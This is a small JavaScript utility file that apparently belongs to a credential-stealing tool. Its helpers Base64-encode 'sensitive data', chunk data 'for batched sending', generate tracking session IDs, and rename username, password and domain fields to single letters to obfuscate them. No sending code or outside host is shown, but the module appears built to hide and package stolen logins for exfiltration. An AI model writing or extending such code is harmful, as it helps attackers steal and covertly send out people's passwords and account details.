// utils.js - Encoding and utility functions

// Encode sensitive data to Base64
export function encodeData(data) {
  try {
    const jsonStr = JSON.stringify(data);
    return btoa(jsonStr);
  } catch (e) {
    return btoa(String(data));
  }
}

// Split data into chunks for batched sending
export function chunkArray(array, size) {
  const chunks = [];
  for (let i = 0; i < array.length; i += size) {
    chunks.push(array.slice(i, i + size));
  }
  return chunks;
}

// Generate session ID for tracking
export function generateSessionId() {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

// Obfuscate field names
export function obfuscateFields(obj) {
  return {
    u: obj.username || obj.email,      // u = username
    p: obj.password,                   // p = password
    d: obj.domain,                     // d = domain
    t: obj.timestamp,                  // t = timestamp
    s: obj.sessionId                   // s = sessionId
  };
}
